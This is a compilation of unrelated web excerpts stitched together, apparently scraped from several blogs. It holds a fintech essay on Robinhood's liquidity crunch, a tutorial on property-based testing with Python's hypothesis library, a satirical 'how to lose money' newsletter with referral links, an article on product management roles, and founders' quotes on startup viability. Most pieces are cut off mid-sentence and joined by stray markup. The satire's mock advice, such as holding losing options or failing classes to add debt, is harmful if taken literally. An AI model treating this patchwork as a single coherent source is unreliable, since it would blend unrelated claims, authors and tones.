<p>Yet this surface-level explanation likely leaves the observant investor with more questions. <em>Okay, so plausibly if we’re trading on margin, Robinhood could face a liquidity crunch. But what’s the problem if we’re trading using our own settled cash?</em> Cash trades need to settle and we have to put down collateral to insure against risk in the meantime. <em>That’s no problem, the internet enables us to process transactions quickly, right?</em> No, it takes two days. <em>Why does it take two days?</em> Transactions are processed at night in batches. <em>Fine then, can’t you use the money we just put up as collateral?</em> You can’t use client funds for that purpose. <em>Why not? Wait, wouldn’t this all be a non-issue if trades cleared near-instantly? Isn’t this a self-imposed problem within the financial industry?</em></p>

<p>Indeed, this doesn’t seem to be how we would design the system from first principles. As it turns out, Robinhood’s liquidity incident only exposes the surface of deeper troubles in fintech. Underneath a world of seamless consumer transacting represented by Robinhood, Venmo, and other apps of their generation lies an underbelly of interconnected financial systems that struggle to meet modern demands. Fintech’s attempts at abstracting away such complexity run into challenges when long-tail events occur, leaving customers frustrated and institutions in danger. A firmer foundational infrastructure from the Fed involving features like open banking, instant P2P payments, and real-time trade settlement (update: <a href="https://blog.robinhood.com/news/2021/2/2/its-time-for-real-time-settlement">Robinhood themselves called for this now!</a>) would allow us to build a more robust layer of services while minimizing rent-seeking middlemen. <strong><a href="https://a16z.com/2020/04/18/its-time-to-build/">It’s Time to Build</a>.</strong></p>

<h2 id="when-abstractions-fail">When Abstractions Fail</h2>

<p>Software engineers define leaky abstractions as when underlying implementation details of a process, meant to be hidden away, become relevant as things fail. From this perspective, Robinhood manifested <strong>an</strong> <strong>abstraction that was not simply leaking but gushing out from every news report</strong> and flooding investors’ brokerage accounts. By hiding the details of a complex settlement process and marking sale proceeds as immediately available to a customer, Robinhood presents a simplified trading process to customers while handling the settlement and margin details behind the scenes. It all works well until some Redditors decide to send a stock to the moon and your platform bears the brunt, I guess. In any case upon discovery of a software bug, it’s an all-too-familiar experience to realize a certain library call isn’t working, and find yourself having to dig further and further into the annals of ancient source code down the chain to figure out where something went wrong.</p>

<p>Since you were never intended to dig this far (you’d never need to, right?), they sure won’t make it easy to dig down there, with obfuscated binaries, hidden state effects, and other nasty monsters of the underworld. Likewise, delving into the GME situation is a hopeless exercise for an average investor who, faced with a sudden message of “trading suspended”, rationally wants to get to the bottom of this. They would quickly find a wall of opaque financial rules with regards to the clearing process that seem to exist on a “need to know’’ basis. If Vlad the CEO himself <a href="https://www.youtube.com/watch?v=2M7X2dsW_Xw">“doesn’t quite know how the formula works”</a>, what hope does the average citizen have to track down the source of this seeming bug in the system? Perhaps we should all just give up, raise pitchforks against Citadel, and call it a day.</p>

<p>The financial world is not new to abstractions, of course. Almost any tangible object or collection of intangibles has been securitized, packaged into new securities, tranched once or twice for good measure, and repackaged - repeat until satisfied. New engineered securities are then available for boomer 401k portfolios, sovereign wealth funds, and anyone else who wants in from the peripheries. These abstractions, in their defense, have usually made the markets in which they’re employed <a href="http://www.oeconomia.actapol.net/pub/9_3_181.pdf">far more efficient and liquid</a>. Mortgage-backed securities, as much as they were maligned for their role in precipitating the Great Recession, made it dramatically easier for cash-strapped homebuyers in North Carolina to be matched up with someone on the other side of the world looking to [in theory] buy a bunch of uncorrelated assets (we all know how that ended though) for their investment portfolio. In exchange for the hard work and research that goes into assembling these securities, <a href="https://www.epi.org/publication/causes-of-wage-stagnation/">financial middlemen wages have shot up dramatically since 1970</a> against a backdrop of broader economic inequality.</p>

<p>But <strong>abstractions are only useful when they’re built upon a well-designed foundation of primitives</strong>. When abstractions are instead used as patches over flimsy Swiss cheese layers of infrastructure, they’re bound to go wrong and leak, making their presence known to the world at the most inopportune time. Like, say, when GME is attempting to go to the moon but passengers are getting ejected for mysterious reasons. <a href="https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/">Joel Spolsky’s Law of Leaky Abstractions</a> asserts that “All non-trivial abstractions, to some degree, are leaky.” Assuming the truth of this statement, building unnecessary layers of complex abstractions compounds the risk for no good return.</p>

<h2 id="fintechs-stopgap-unicorns">Fintech’s Stopgap Unicorns</h2>

<p>The brave new world of fintech software consists of many such abstractions that really ought not to exist in an ideal world with better financial infrastructure. It’s a classic American story of governmental inaction and private opportunists seeking to fill the gap, providing acceptable service and pocketing some hefty middleman profits in the meantime. The existence of these entrenched middlemen further dampens any political interest in solving root causes of central dysfunction, and so the cycle is perpetuated.</p>

<p>Take Venmo for example. Nations around the world have begun setting up open banking APIs for peer-to-peer payments and other services by legally mandating interconnectability. The European Union’s <a href="https://en.wikipedia.org/wiki/Payment_Services_Directive">Revised Payment Services Directive</a> went into effect in 2018 putting Europe at the forefront of open banking initiatives. Supporting payments is a core function that makes a bank a bank, and in the 21st century, those payments occur over the internet and so we expect instant deposits. Instead, if we rely on existing open standards for payment in the US, ie. ACH deposits, it seems the <a href="https://www.nerdwallet.com/article/banking/ach-transfers">fastest we can do is a few business days</a> or pay up for expensive wire transfers. And conveniently those are extra days where funds are in limbo mean that banks can earn some extra interest.</p>

<p>The US has taken a market-driven approach to hoping for more interconnectedness between banks, resulting in Zelle, a P2P payment system created by a bank consortium that <a href="https://www.nytimes.com/2018/04/22/business/zelle-banks-fraud.html">is sometimes secure</a>. Meanwhile Venmo has the first-mover advantage in the P2P payment space, and has built out a formidable network of users in a domain where implicit trust in identities is critical. Don’t like those options? You’re also free to use Messenger Pay, Apple Pay, CashApp, among a myriad set of options. Clearly, the fragmentation is killing us here, making what intuitively wants to be a well-designed protocol a mess of walled gardens with varying functionality. These days, it’s hard to even grasp how protocols like email, or heck even USPS mail, ever came to fruition against the alternative crop of self-interested ecosystems.</p>

<p>Venmo won by building an abstracted network that appears to support instant peer-to-peer payments based just on a username. Underneath, of course, it rarely arranges for any bank transfers at all, and simply adjusts numbers in a database until a user actually wants to cash out. In the meantime, parent company PayPal can enjoy <a href="https://www.marketplace.org/2018/02/20/what-are-apps-venmo-doing-your-money/">the returns on idle capital</a> chilling in user wallets. This middleman profit, along with various fees for third-party integrations, seems like a fair concession for the services provided. But it gets worse: <a href="https://github.com/ccorcos/venmo-dark-patterns">Venmo is filled with dark patterns</a> that try to encourage you to share as much financial data as possible with them and others, in vague hopes of building “a social network” since apparently that’s the only end game allowed in the Valley. Perhaps outsourcing critical financial functions to growth-hungry companies with flimsy morals wasn’t such a great idea after all.</p>

<p>Plaid is another example of a Silicon Valley fintech darling filling in a gap resulting from our lack of an interbank API. Plaid allows users to connect bank accounts to other apps by logging into bank accounts on users’ behalf and scraping relevant data. Again, it’s easy to spot the …</p></section></div>

<h2 id="overview">Overview</h2>
<p>Writing tests today sucks. Tests are expensive to write. They're even more
expensive to maintain. They're somewhat opaque to anybody who's not intimately
familiar with the test harness. You can't always be sure whether you're writing
the “right” tests for your situation. Worst of all, it's sometimes difficult to
persuade a non-technical stakeholder that software testing actually does
anything underneath the hood, except maybe inflate operational expenses for your
software budget. <a href="https://news.ycombinator.com/item?id=18442941">Every software development horror
story</a> I've heard comes with some
discussion around tests, and that's because not only does software fail in more
ways than anybody without job security may care to admit, it fails in novel and
unpredictable manners.</p>
<p>What sucks even more is <em>just how important effective software testing is</em> for
software engineers to quickly and confidently contribute value. The absolute
first thing I do after cloning most <code>git</code> repositories these days, for work or
otherwise, is run the test suite. Test suites are self-documenting and always
more accurate than a wiki or other forms of documentation, and since they're
programmatic it's much easier to tie into the rest of your developer workflow
(say when setting up automated deployments to production).</p>
<hr>
<p>Honestly, this probably isn't news to you if you've been working in industry for
a while, and it's easy to fall into a trap of powerlessness and believing any
endemic lack of alignment is eternal. And while it's not always (and usually
not) the fault of technical limitations, it may be useful to think of technical
ways to grow beyond the immediate problem. So I'd like to say there are two
great aspects about professional software that could be applied to software
testing.</p>
<p>The first is we're usually using paradigms that are decades old. Professional
software is usually incremental in action and incrementalist in thinking. This
implies there's often new concepts in academia or research that might solve
current problems. One professor I talked to around graduation 4 years ago
brought up how the A* path-finding algorithm was invented 20 years before its
adoption in the video game industry (and apparently that's at least one reason
why NPCs don't collide with in-world walls anymore).</p>
<p>The second is test suites usually under the full control of engineering. There
might be a QA department within engineering, but I have yet to see a
sales/marketing department care deeply about how you structure a test harness,
vs. the layout of a landing page. While serving the company is the goal of any
business-oriented engineering department, this means there's more agency than
usual in how engineering approaches testing, than say product implementation or
devops.</p>
<p>What we're looking for as software engineers is to write as many good tests as
possible within some limited time frame.</p>
<h2 id="different-software-testing-strategies-ive-used">Different software testing strategies I've used</h2>
<p>The most important thing about writing good tests is to start writing good
source code and develop good habits. This might involve separating concerns in a
codebase by using functions instead of classes, gradually applying type
signatures using <code>mypy</code> or <code>pyre-check</code> and adding a typechecking step to your
CI pipeline, and paying attention to software properties like immutability
(updating an object creates a copy of the object with the update instead of
mutating the original object) and idempotency (running a code block generates
the same output for the same input even for multiple runs). You can bring a lot
of value to the table by using tools + infrastructure like <code>black</code> for
autoformatting and Docker / <code>docker-compose</code> for running local infrastructure,
and a lot of this undergirds higher-order testing strategies like property-based
testing later on.</p>
<p>Some of these strategies I've applied in the field revolve around these simpler
ideas. When I'm building a webapp frontend or backend, I adopted the idea of
“functional core, imperative shell”, where you have a soup of decoupled methods
within your app that are easily unit testable, and a set of well-defined I/O
interfaces and stubs to imperative resources like your network or database to
create the cheapest possible integration tests. This is nice for stateless,
pass-through entities, but works less well when you're primarily looking for
effects (e.g. it'd be very difficult to unit test most of PostgreSQL
effectively). So when I became a data engineer, and I spent most of my day
interacting with effectful systems, I attempted with some success to write a set
of <a href="https://bytes.yingw787.com/posts/2018/11/07/data_driven_testing">data-driven integration tests using
<code>pytest</code></a> and leverage its ability to
parameterize over fixtures using data to create essentially a mongodump of test
descriptions. This solution was nice since it allowed me to scale the amount of
data I tested far beyond the amount of code I needed to write. However, I still
needed to come up with my own oracle values to test with. It's easy to run an
expensive integration test with very little added value.</p>
<p>This is where my interest in property-based testing stems from. I'd also mention
that even with property-based testing, all these testing strategies (and others
I haven't covered or discovered yet) have their place and their tradeoffs. You
should decide for yourself when to apply or to not apply each.</p>
<h2 id="what-is-property-based-testing">What is property-based testing?</h2>
<p>At its simplest, property-based testing is the inverse of normal unit testing.
Instead of providing some amount of data and a transformation so the computer
can assert a property, you provide a property and a transformation, so the
computer can provide some data.</p>
<p>Let's go back to the basics. Say you defined a method <code>addOne()</code> to increment an
integer by one:</p>
<div><pre><code data-lang="python"><span>def</span> <span>addOne</span>(x: int) <span>-</span><span>&gt;</span> int:
    <span>return</span> x <span>+</span> <span>1</span>
</code></pre></div><p>In order to test method <code>addOne()</code>, you can define a set of unit tests:</p>
<div><pre><code data-lang="python"><span>def</span> <span>test_addOne</span>():
    <span>assert</span> addOne(<span>5</span>) <span>==</span> <span>6</span>
</code></pre></div><p>You can even parameterize a list of oracle inputs and expected values:</p>
<div><pre><code data-lang="python"><span>import</span> pytest

<span>@pytest.mark.parametrize</span>(<span></span><span>'</span><span>_input, _expected</span><span>'</span>, [(<span>5</span>,<span>6</span>), (<span>6</span>,<span>7</span>), (<span>7</span>,<span>8</span>)])
<span>def</span> <span>test_addOne</span>(_input, _expected):
    <span>assert</span> addOne(_input) <span>==</span> _expected
</code></pre></div><p>The final leap is realizing that instead of coming up with your own oracle
values, you just care that the inputs are integers and the outputs are a
functional, deterministic transform resulting in an integer output. This is
where property-based testing:</p>
<div><pre><code data-lang="python"><span>from</span> hypothesis <span>import</span> given, strategies <span>as</span> st

<span>@given</span>(st<span>.</span>integers())
<span>def</span> <span>test_addOne</span>(_input):
    <span>assert</span> addOne(_input) <span>==</span> _input <span>+</span> <span>1</span>
</code></pre></div><p>For some properties, you can define and apply the opposite transform, which when
combined with the original transform, generates the identity function, which
should then leave the input untouched:</p>
<div><pre><code data-lang="python"><span>def</span> <span>subOne</span>(x: int) <span>-</span><span>&gt;</span> int:
    <span>return</span> x <span>-</span> <span>1</span>

<span>from</span> hypothesis <span>import</span> given, strategies <span>as</span> st
<span>@given</span>(st<span>.</span>integers())
<span>def</span> <span>test_addsub_returns_value</span>(_input):
    <span>assert</span> subOne(addOne(_input)) <span>==</span> _input
</code></pre></div><p>So what else is it similar to / different from? One's <em>generative testing</em>,
which are tests that create tests. Since we're creating a spec here,
<code>hypothesis</code> is generating tests underneath the hood for us and running them.
Otherwise, property-based testing is a bit different as it supports intelligent
search strategies that allow us to shrink the error space.</p>
<p>Another testing paradigm similar to property-based testing is <em>fuzz testing</em>,
where random inputs are inserted into a program to see how it behaves and
whether it crashes. To me, fuzz testing is more an extension of black-box
integration testing, and extends more into devops or security related testing,
rather than the unit-focused nature of property-based testing.</p>
<h2 id="what-is-hypothesis">What is <code>hypothesis</code>?</h2>
<p><code>hypothesis</code> is one of the more popular implementations of property-based
testing in Python. I had thought it originated from a PBT library called
<a href="https://hackage.haskell.org/package/QuickCheck"><strong><code>QuickCheck</code></strong></a> in Haskell,
but after reading through a Haskell book earlier this year and <a href="https://lobste.rs/s/ovebeq/pythonista_s_review_haskell#c_gz09vc">talking to some
folks online</a>,
there's a more “intelligent” PBT library in Haskell it came from called
<a href="https://hackage.haskell.org/package/hedgehog"><strong><code>Hedgehog</code></strong></a>, which applies
built-in shrinking as part of the test generation suite.</p>
<p>You can find the <code>hypothesis</code> for Python documentation
<a href="https://hypothesis.readthedocs.io/en/latest">here</a>, and additional
documentation around the team behind Hypothesis
<a href="https://hypothesis.works/">here</a>.</p>
<h3 id="hypothesis-strategies"><code>hypothesis</code> strategies</h3>
<p>The key idea behind <code>hypothesis</code> is strategy generation. You can see examples of
it by running this code segment in your <code>python</code> terminal:</p>
<div><pre><code data-lang="python"><span>from</span> hypothesis <span>import</span> strategies <span>as</span> st

st<span>.</span>text()<span>.</span>example()
</code></pre></div><p><code>hypothesis</code> supports basic strategies like those targeting Python's “primitive”
types. You can create <code>st.integers()</code> or <code>st.text()</code>. You can also do more
advanced things, like create strategies from structs like dictionaries or lists,
combine strategies together, infer strategies from a regular expression, and
build strategies from well-recognized third-party classes from <code>pandas</code> or
Django.</p>
<h3 id="hypothesis-tactics"><code>hypothesis</code> tactics</h3>
<p>I took a lot of these tactics from <a href="https://www.youtube.com/watch?v=KcyGUVzL7HA">a talk by Zac Hatfield-Dodds introducing PBT
at PyCon US</a>. Check out his website
<a href="https://zhd.dev/">here</a>.</p>
<p>The types of properties you can apply with <code>hypothesis</code> allow for certain
tactics you can play with in <code>hypothesis</code>.</p>
<p>One of these tactics might be manually defining the property, then letting
<code>hypothesis</code> generate the test cases for you. One common way this tactic is
applied is to look for “round-trip” properties, where you look for the inverse
method and check that applying both would result in the identity method.</p>
<p>Another tactic might be to use an oracle function. This can be really helpful if
you're refactoring a piece of code and you want to carry forward the original
behavior of that method, regardless of whether it's correct or incorrect. In
this case, that method becomes an oracle and you can apply the equal-by-value
constraint between the original and refactored methods as a …</p></div></div>

      <p><strong>1. Trade Options</strong></p><p><em>Fastest</em></p><p>No doubt you have heard all about how easy it is for people to lose their life savings trading securities in the stock market. But there is actually a much faster way – options. I’m not going to get into the nuts and bolts of trading options (actually, most people who lose money with options don’t understand how they work anyway) but I will give you a quick definition and then show how efficient these instruments-of-wealth-destruction really are.&nbsp;</p><p>There are two types of options – calls and puts. If you buy a call option, you are purchasing the right to but the underlying stock at a specified price. So, you might pay $3,000 dollars for the right to buy 100 shares Microsoft stock at $200 per share. Then, if the stock goes up to $300 you can either buy 100 shares at $200, or you can sell the option to some other idiot and they can use it to buy the shares. But, as you might imagine, that options contract is worth a lot more than $3,000 now, and you can sell it for a premium. This is how leverage works to make money. But we’re concerned about how to use leverage to lose money.&nbsp;</p><p>The nice thing about options is that there isn’t just one way to lose money. No, you can lose money in many different ways – far more than I can write on this page. But, if you’re looking to lose money don’t bother to read up on the different ways to trade options. Just go for it, and I’m certain you will lose everything. I’ll give you a few real-life examples of how I’ve lost money in options. First, buy options that are about ready to expire. In the previous example, if you bought the Microsoft options for $3,000, but the stock went to $195 instead of $300, you could lose all your money. Another easy way to lose money with options is to buy contracts that are way out of the money (OTM). This simply means you might buy Microsoft options that give you the right to buy stock at $200 – except this time, the stock is at $150 per share. If you do this, you won’t find anyone willing to buy the option contract back from you (after all, why would someone pay for the right to buy stock at $200 if it’s already at $150). And if you can’t find anyone to buy the contract from you it will expire worthless and you’ll lose all your money. Another favorite is not cutting your losses. If your contract is losing money (this often happens if you think the stock is going to go up but it goes down) and you want to lose more money, just hold it and don’t sell. Options decay with time so the longer you hold it the more likely it is that you will lose all your money. So, simply hold your position when it starts to go south and you’ll lose way more money.</p><p>Pro tip – Make sure to buy a bunch of contracts (say 10 of them) so you lose $30,000 instead of $3,000.</p><p>I could go on but I think you get the point. I have personally lost thousands of dollars using these methods and would highly recommend them to anyone looking for a fast way to lose it all. I’d recommend you try losing a small amount in stocks first to get your feet wet – then dive into options. If you’re anxious to give it a go, <a href="https://cash.app/app/TDZWWPC?utm_campaign=UA-188825179-1&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">use this link to start trading with Cash App</a> and you’ll get free money to lose right away.</p><p>The only options trader who doesn’t lose money is the one who never starts.</p><p><em>- Andrew Tye</em></p><p><strong>2. Write a Book</strong></p><p><em>Most consistent</em></p><p>You might think writing a book is a great way to make a bunch of cash – and you’d be wrong. In spite of the many books that will tell you how to make money writing a book, I’m here to let you in on a secret –writing a book is actually a fantastic way to lose money. I’ve written four short books and they have literally grossed hundreds of dollars. Now – hearing that I’ve sold some books might make you think you should write one also. But it’s a trap – you will spend hundreds of hours writing a book and then make hundreds of dollars in return. Not sure about you, but if I’m working for $1/hour I’m losing money fast. My latest book probably has more pages than it has copies sold – <a href="https://gum.co/getajob?utm_campaign=UA-188825179-1&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">take a look here</a> if you want a quick reference on how to get a job.</p><p><strong>3. Teach Online Courses</strong></p><p><em>Most helpful</em>&nbsp;</p><p>Aw, I love this one. You can help other people learn a skill and lose your money at the same time. Win-lose. Some folks think they can make a great online course and it will make them a nice living or side income. Most of those nice people are wrong. News flash – more people lose money creating online courses than make money from them. The good news for you is that there really aren’t many barriers to entry here. Get yourself a cheap mic (who needs quality audio anyway) and an inexpensive webcam. And go to town without bothering to make an outline. I’ve found a couple approaches that both work well. Option A - read the script from a piece of paper. Option B – don’t plan at all and just wing the recording.&nbsp;</p><p>This is a strategy that I’ve already proven out for you. I created a few classes online and over the past 5 years they have actually generated thousands of dollars. But net returns are certainly negative because for those thousands of dollars I spent hundreds of hours creating content, answering questions, and buying likes. If you’d like a good idea of what to expect, I have over 40,000 students taking my online courses and they have generated a few thousand in gross revenues.</p><p>Pro tip – make your courses free from the start – you will recoup less of your investment this way, and end up losing quite a bit more overall.</p><p><strong>4. Get a Degree</strong></p><p><em>Most socially acceptable</em></p><p>This tactic is harder to lose money with, but when you lose you lose big. Books and courses are more consistent losers, but they don’t add up as fast as big tuition debt combined with time off work. As mentioned, you do have to be careful with this one because it is possible to get a degree and actually make money. But here is what you do to ensure loss. First, choose a degree that you aren’t passionate about, or that doesn’t have high paying jobs, or that doesn’t really have any jobs (<a href="https://lunarjobs.co/radar?utm_campaign=UA-188825179-1&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">research here</a>). Second, don’t get a side job during school and take all of the student loans you can get your hands on. Third, be very picky about which of the few jobs you take and only take ones that are in fact low paying (high cost of living is also preferred when choosing location). </p><p>Pro tip – fail a few classes to extend your time to graduation – that way you can take on more debt.&nbsp;</p><p>One thing to watch out for is accidentally choosing a degree that can actually make you money. Like engineering or computer science. But even this caution is less important now than when I went to college because places like Lambda School are making four year university degrees more certain losers. I’ve been on both sides of this one. I spent two years studying software development and about 4 years studying engineering. Both of those degrees were inexpensive, I worked part-time while studying, and have made money with both of them. But, thankfully I learned my lesson and managed to lose a lot of money by the time I got an MBA. I could have started a company with the money, or just worked my way up in an engineering role. But by taking on a bunch of debt and forgoing a salary for a couple years I was able to lose way more money than if I’d simply started a company. I think I actually lost more by going to business school than if I’d started a company and lost all of the investors’ money!</p><p><strong>5. Become an Inventor</strong></p><p><em>Most fun</em></p><p>Okay people, this has to be one of the most enjoyable ways to lose money! I have drummed up all sorts of new inventions. Of course, they don’t make any money but that’s sort of the point right! Most of my awesome inventions failed make money because someone else took them to market before me. Other times it was because they were so stupid nobody wanted to buy them (or even look at them actually).</p><p>I’ve invented lots of awesome products that lost money, but here is one of my favorite no-hits:</p><p><em>Barking Bulb</em>: Scare away intruders with a bark</p><p>Don’t want a dog in your backyard? Fine, get a bulb that barks when intruders are detected. Light, motion sensing and sound in one bulb. I thought this was so brilliant. Safe as having a guard dog, but you don’t have to clean up after it. Literally the best of both worlds. Coming soon to a Home Depot near you!&nbsp;</p><p>Pro tip: Go straight for all of the full, non-provisional patents you can before you know if anyone wants the idea. Don’t wait to see if it’s manufacturable. Don’t do market research to see if competitive products exist. Just talk to an attorney and get the patents drawn up. This shortcut will let you lose $20,000 to $40,000 upfront before you even start doing hardcore R&amp;D or go to production.</p><p><strong>6. Do Internet Advertising </strong></p><p><em>Most controversial&nbsp;</em></p><p>Another interesting way to lose money is with online advertising. What I like most about this one is you can lose money consistently and sound smart to your friends at the same time. Where do you spend your money they ask? Oh, I have a website with ads. Wow. That is so cool. What you do is setup a website with some content (e.g. a blog about how to lose money) and you put some ads (from Google AdSense or affiliates) on it that will generate money for you. Then, to get more people to your blog you also buy ads from Google Ads or Facebook. If you do it just right there is arbitrage here – for every dollar you spend buying ads to get traffic to your site you can get 70 cents of income from the ads on your blog. You can consistently lose $0.30 for every $1.00 you spend. The downside is nearly unlimited as long as you pick a topic that has significant search traffic.</p><p>This one is somewhat controversial because a lot of people think that putting ads on your site and then buying other ads to get more traffic is actually a good way to make money. I’ve proven that it’s much easier to lose money with this method than it is to make money. So you can ignore the doubters.</p><p><strong>7. Stop finishing Projects</strong></p><p><em>Biggest loss</em></p><p>I have completely mastered this one. It has a sweet combination of money lost from working for …</p></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>This is a question that often arises in the product world and it requires our time to unpack it. Though these roles are somewhat similar and they work towards achieving the same set of goals, we then ought to look at the clear line distinction in the line of duty of the individuals and performance metric used to evaluate the success achieved by each role to help us understand them better and also help you figure out the most suitable for you.</p><p>These roles vary from company to company as in the case of a startup, a product manager is often tasked with the duty of these 3 roles while in larger or enterprise companies, there are 3 or more different roles in the product team working at different capacities to ensure that the right product is shipped and meet the demands of users.</p><p>While the product manager’s role is one that has come to limelight, the product marketing manager and product owner role have also been adopted by a lot of companies depending on their product and company culture. In this article, we will explain the difference between these roles and the job requirement of the individual involved.</p><h3 id="the-product-manager">The Product Manager</h3><p>These individuals are often referred to as mini CEOs of a product. They conduct customer surveys to figure out the customer’s pain and build solutions to address it. The PM also prioritizes what features are to be built next and prepares and manages a cohesive and digital product roadmap and strategy.</p><h3 id="the-product-marketing-manager">The Product Marketing Manager</h3><p>The PMM communicates vital product value — the “why”, “what” and “when” of a product to intending buyers. He manages the go-to-market strategy/roadmap and also oversees the pricing model of the product. The primary goal of a PMM is to create demand for the products through effective messaging and marketing programs so that the product has a shorter sales cycle and higher revenue.</p><h3 id="the-product-owner">The Product Owner</h3><p>This role exists in a scrum environment — <em><a href="https://www.scrum.org/resources/what-is-scrum" title="Scrum" target="_blank" rel="noreferrer">Scrum</a> is a framework for project management that emphasizes teamwork, accountability, and iterative progress toward a well-defined goal.</em></p><p>A product owner (PO) maximizes the value of a product through the creation and management of the product backlog, creation of user stories for the development team. The product owner is the customer’s representative to the development team. He addresses customer’s pain points by managing and prioritizing a visible product backlog. The PO is the first point of call when the development team needs clarity about interpreting a product feature to be implemented.</p><p><span>

    </span></p><p>Going more practical, we will use a hypothetical case study of a tech company, Slyde, to explain these roles to clearly understand their day-to-day duties.</p><p>Slyde is a financial technology company based in Lagos, Nigeria with coverage in other African countries. The company has been providing payment solutions through its web-based application but has noticed a large churn rate in areas with poor internet connection which in turn delay users from completing their transaction. The product team made this observation and has been tasked to come up with a solution.</p><h3 id="where-does-the-product-manager-product-marketing-manager-and-the-product-owner-come-in">Where does the Product Manager, Product Marketing Manager, and the Product Owner come in?</h3><p><strong>PM</strong>: The Product Manager will interface with the users through user interviews/feedback surveys or other means to hear directly from the users. They will come up with hypotheses alongside the team and validate them through prototyping and user testing. They will then create a strategy on the feature and align the team and stakeholders around it. The PM who is also the chief custodian of the entire product roadmap will, therefore, be tasked with the duty of prioritization. Before going ahead to carry out research and strategy, they will have to convince the stakeholders if it is a good choice to build the feature in context at that particular time or wait a bit longer based on the content of the roadmap.</p><p><strong>PMM</strong>: The product marketing manager is tasked with market feasibility and discovering if the features being built align with the company’s sales and revenue plan for the period. They also make research on how sought-after the feature is being anticipated and how it will impact the budget. They communicate the values of the feature; the why, what, and when to potential buyers — In this case users in countries with poor internet connection.</p><p><strong>PO</strong>: The product owner will first have to prioritize the backlog to see if there are no important tasks to be executed and if this new feature is worth leaving whatever is being built currently. They will also consider the development effort required to build the feature i.e the time, tools, and skill set that will be required. They will be the one to tell if the expertise of the current developers is enough or if more engineers or designers are needed to be able to deliver at the scheduled time. The product owner is also armed with the task of interpreting the product/feature requirements for the development team. They serve as the interface between the stakeholders and the development team.</p><hr><p>Lastly,</p><p>The goal of a product team is to delight its user by providing an excellent solution to their pain points regardless of the job title/role. Irrespective of your job role on a product team, you should always be driven by user empathy and the company’s goal as this will in-turn make you collaborate better among the team. A product person should first and foremost see themselves as a product leader — one who makes sure the user’s need is always advocated for, despite top executive declination, the product person is to persuasively align the executive to this.</p><blockquote><blockquote><p>Product Owner is a role you play on a Scrum team. Product Manager is the job. — Melissa Perri</p></blockquote></blockquote><p>So, regardless of your job role, a great product person will always act in the stead of a product manager and never streamline herself to the JD only but be actively involved directly or indirectly in every phase of the product development cycle. When the role is clearly understood and the duties implemented collaboratively as a team, every aspect of the product comes together in one beautiful piece.</p><p>This article first appeared on my <a href="https://blog.usejournal.com/product-manager-vs-product-marketing-manager-vs-product-owner-8ab08bc45662" title="Medium" target="_blank" rel="noreferrer">Medium</a></p><p>Thanks to <a href="https://www.linkedin.com/in/olufisayo-babalola/" target="_blank" rel="noreferrer">Olufisayo Babalola</a> for reviewing this article.</p><hr><h3 id="sources">Sources:</h3><ul><li><a href="https://unsplash.com/s/photos/product-manager?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank" rel="noreferrer">Hero Image by airfocus on Unsplash</a></li></ul></div></article></div>]]>

Our product (dbt) was a tool that I wanted to use in order to deliver services, and I honestly never believed at the outset that there would be many other folks in the world who wanted to use it. But it turns out that there are. So it took a full 3.5 years from launching dbt and watching its growth before I felt confident that we had a real shot at being a "big" company. This is one of the main reasons we waited for so long to raise capital--we bootstrapped the entire way until we felt like we had that confidence.  </span></p><p id="viewer-cj0e4"><span>It's an unusual approach and I'm not sure it would work for every situation and every founder, but our path has had a ton of really unique benefits for us and I wouldn't trade it for anything.</span></p><p id="viewer-b0ecd"><span><span>- Tristan Handy, </span>Founder and CEO<span>, </span><a href="https://www.fishtownanalytics.com/" target="_blank" rel="noopener"><u><span>Fishtown Analytics</span></u></a> </span></p><h3 id="viewer-63li0"><span><span><strong>Breaking even from a Thanksgiving promotion</strong></span></span></h3><p id="viewer-394rh"><span>Honestly, I knew it was "viable" ever since I started the company - otherwise I certainly wouldn't have started it :)</span></p><p id="viewer-64kiv"><span>When I knew we'd hit the inflection point of growth though is when we ran a promotion one time, I think it was a Thanksgiving day promotion - and we sold enough in those couple days that paid for the monthly expenses at the time. That single even made us breakeven and I knew we had something that people would pay for, and that could grow quickly.</span></p><p id="viewer-fsd94"><span><span>- </span>Zeb Evans, Founderf &amp; CEO, <a href="http://clickup.com/" target="_blank" rel="noopener"><u><span>ClickUp</span></u></a> </span></p><h3 id="viewer-bugts"><span><strong><span>Scalable + Repeatable + Margins </span></strong></span></h3><p id="viewer-8p59e"><span>When we had a scalable and repeatable sales motion with acceptable margins and a large enough addressable market.

There were early indicators around 12 to 18 months into Tonic when we started signing up customers who were paying real amounts. They were putting up with our buggy early versions and eagerly asking for when certain new features would be available. Over the next 6 months we had our first renewal and a large contract upsell, that's when things realized things had been viable for a while.</span></p><p id="viewer-1fout"><span><span>- Karl Hanson, Co-Founder COO, </span><a href="https://tonic.ai/" target="_blank" rel="noopener"><u><span>Tonic</span></u></a> </span></p><h3 id="viewer-9ek41"><span><strong><span>Open-source project with organic adoption</span></strong></span></h3><p id="viewer-buitk"><span>It wasn't a hard question for me. It was because my startup was built around an open-source project. The project was adopted organically by multiple enterprises, and developers (who are our main users) gave us pretty positive feedback. So it was clear that idea was viable long before we started thinking about founding a company.</span></p><p id="viewer-dqpja"><span><span>- Maxim Fateev, Founder, </span><a href="https://temporal.io/" target="_blank" rel="noopener"><u><span>Temporal Technologies</span></u></a> </span></p><h3 id="viewer-avmqj"><span><strong><span>Positive feedback on prototype</span></strong></span></h3><p id="viewer-bm6qc"><span>When we started Animoto in 2006 our first priority was to create a video creation product that we wanted to use ourselves. Before Animoto, it was too difficult and time-consuming to create great-looking video. Cloud-based video rendering had never been done before so we gave ourselves three months to create a prototype that would both prove out the technical concept and allow us to get user feedback. While entrepreneurs always have to be optimistic, it was only once we proved out the technical concept and got positive user experience feedback from family and friends that we knew our idea and product was viable.</span></p><p id="viewer-7tp4h"><span><span>- </span>Brad Jefferson<span>, CEO &amp; Co-Founder, </span><a href="https://animoto.com/" target="_blank" rel="noopener"><u><span>Animoto</span></u></a><span> </span></span></p><h3 id="viewer-2mf9g"><span><strong><span>First enterprise customer on annual contract</span></strong></span></h3><p id="viewer-2prob"><span>In my startup Qwiklabs when we had a first enterprise customer sign an annual contract I knew my product/startup idea was viable. At this point we had a minimalist product addressing the critical user journey. It was unclear at that point if there was a product/market fit (that is: if we had a great product for a large market). But it was clear that our idea and MVP were 